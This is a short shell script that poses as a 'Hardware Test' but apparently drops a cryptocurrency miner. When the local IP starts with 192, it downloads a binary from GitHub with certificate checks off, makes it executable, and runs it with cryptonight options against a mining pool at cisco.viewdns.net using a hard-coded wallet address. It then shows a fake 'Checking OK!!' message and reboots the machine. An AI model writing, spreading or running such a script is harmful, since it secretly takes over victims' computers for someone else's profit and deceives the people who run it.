#!/bin/sh
#190320

END="cisco.viewdns.net"
PORT="80"
USER="497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg"
TAG="OSRUN"

_REBANNER(){
  clear
  echo "Hardware Test"
  echo "-------------"
  echo "Checking OK!!"
  echo ""
  echo ""
  echo "PRESS [ENTER] TO RESTART"
  read VAR
  reboot
}

_RUN(){
  wget --no-check-cert https://github.com/osrun/beta/raw/master/run
  chmod +x run
  sysctl -w vm.nr_hugepages=128
  ./run -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
  _REBANNER
}

if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
 _RUN
fi
